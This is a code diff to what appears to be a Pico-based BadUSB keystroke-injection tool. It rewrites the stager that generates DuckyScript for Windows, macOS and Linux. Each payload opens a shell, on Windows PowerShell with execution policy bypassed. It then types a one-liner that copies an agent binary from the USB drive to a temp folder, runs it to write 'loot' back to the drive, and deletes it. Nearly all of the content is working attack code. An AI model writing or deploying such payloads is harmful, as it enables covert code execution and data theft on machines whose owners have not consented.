@@ -85,33 +85,6 @@ def _ducky_type_line(line: str) -> str:
     return 'STRING ' + line + '\nENTER\n'
 
 
-def _sh_single_quote(value: str) -> str:
-    return "'" + value.replace("'", "'\"'\"'") + "'"
-
-
-def _sh_script_writer_command(lines: tuple[str, ...]) -> str:
-    quoted_lines = ' '.join(_sh_single_quote(line) for line in lines)
-    return (
-        'tmp=/tmp/pico_bit_usb.sh; '
-        "printf '%s\\n' "
-        + quoted_lines
-        + ' | cat > "$tmp" && chmod +x "$tmp" && sh "$tmp"; rm -f "$tmp"'
-    )
-
-
-def _ps_single_quote(value: str) -> str:
-    return "'" + value.replace("'", "''") + "'"
-
-
-def _ps_script_writer_command(lines: tuple[str, ...]) -> str:
-    quoted_lines = ','.join(_ps_single_quote(line) for line in lines)
-    return (
-        "$p=Join-Path $env:TEMP 'pico_bit_usb.ps1'; "
-        '@(' + quoted_lines + ') | Set-Content -LiteralPath $p -Encoding ASCII; '
-        '& $p; Remove-Item $p -Force -ErrorAction SilentlyContinue'
-    )
-
-
 class _BinaryMixin:
     _usb: USBService
 
@@ -132,60 +105,43 @@ class _BinaryMixin:
     def _usb_drive_stager_script(self, target_os: str) -> str:
         agent_name = usb_agent_filename(target_os)
         if target_os == 'windows':
-            lines = (
-                '$r = ""',
-                'foreach ($drive in Get-PSDrive -PSProvider FileSystem) {',
-                "$candidate = Join-Path $drive.Root '" + agent_name + "'",
-                'if (Test-Path $candidate) { $r = $drive.Root; break }',
-                '}',
-                'if ($r) {',
-                "$s = Join-Path $r '" + agent_name + "'",
-                "$loot = Join-Path $r '" + _USB_LOOT_FILE + "'",
-                "$exe = Join-Path $env:TEMP 'pico_agent.exe'",
-                'Copy-Item $s $exe -Force',
-                '& $exe --loot-out $loot',
-                'Remove-Item $exe -Force -ErrorAction SilentlyContinue',
-                '}',
+            cmd = (
+                'foreach($d in Get-PSDrive -PSProvider FileSystem){'
+                "$s=Join-Path $d.Root '" + agent_name + "';"
+                'if(Test-Path $s){'
+                "$x=Join-Path $env:TEMP 'pa.exe';"
+                'cp $s $x;'
+                "if($?){& $x --loot-out (Join-Path $d.Root '" + _USB_LOOT_FILE + "')};"
+                'del $x -ea 0;break}}'
             )
             return (
                 'DELAY 700\nGUI r\nDELAY 700\n'
                 'STRING powershell -NoProfile -ExecutionPolicy Bypass\nENTER\n'
-                'DELAY 1800\nDEFAULTCHARDELAY 10\n'
-                + _ducky_type_line(_ps_script_writer_command(lines))
+                'DELAY 1800\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
             )
 
         if target_os == 'macos':
-            lines = (
-                'for d in /Volumes/*; do',
-                'if [ -f "$d/' + agent_name + '" ]; then',
-                'cp "$d/' + agent_name + '" /tmp/pico_agent',
-                'chmod +x /tmp/pico_agent',
-                '/tmp/pico_agent --loot-out "$d/' + _USB_LOOT_FILE + '"',
-                'rm -f /tmp/pico_agent',
-                'break',
-                'fi',
-                'done',
+            cmd = (
+                'for d in /Volumes/*;do if [ -f "$d/' + agent_name + '" ];'
+                'then cp "$d/' + agent_name + '" /tmp/pa'
+                '&&chmod +x /tmp/pa'
+                '&&/tmp/pa --loot-out "$d/' + _USB_LOOT_FILE + '"'
+                ';rm -f /tmp/pa;break;fi;done'
             )
             return (
-                'DELAY 700\nGUI SPACE\nDELAY 600\nSTRING Terminal\nENTER\n'
-                'DELAY 2600\nDEFAULTCHARDELAY 10\n'
-                + _ducky_type_line(_sh_script_writer_command(lines))
+                'DELAY 700\nGUI SPACE\nDELAY 1000\nSTRING Terminal\nENTER\n'
+                'DELAY 4000\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
             )
 
-        lines = (
-            'for d in /media/$USER/* /run/media/$USER/* /mnt/*; do',
-            'if [ -f "$d/' + agent_name + '" ]; then',
-            'cp "$d/' + agent_name + '" /tmp/pico_agent',
-            'chmod +x /tmp/pico_agent',
-            '/tmp/pico_agent --loot-out "$d/' + _USB_LOOT_FILE + '"',
-            'rm -f /tmp/pico_agent',
-            'break',
-            'fi',
-            'done',
+        cmd = (
+            'for d in /media/$USER/* /run/media/$USER/* /mnt/*;'
+            'do if [ -f "$d/' + agent_name + '" ];'
+            'then cp "$d/' + agent_name + '" /tmp/pa'
+            '&&chmod +x /tmp/pa'
+            '&&/tmp/pa --loot-out "$d/' + _USB_LOOT_FILE + '"'
+            ';rm -f /tmp/pa;break;fi;done'
         )
-        return 'DELAY 700\nCTRL-ALT t\nDELAY 2200\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(
-            _sh_script_writer_command(lines)
-        )
+        return 'DELAY 700\nCTRL-ALT t\nDELAY 3500\nDEFAULTCHARDELAY 10\n' + _ducky_type_line(cmd)
 
     def _stager_script(self, target_os: str) -> str:
         return self._usb_drive_stager_script(target_os)
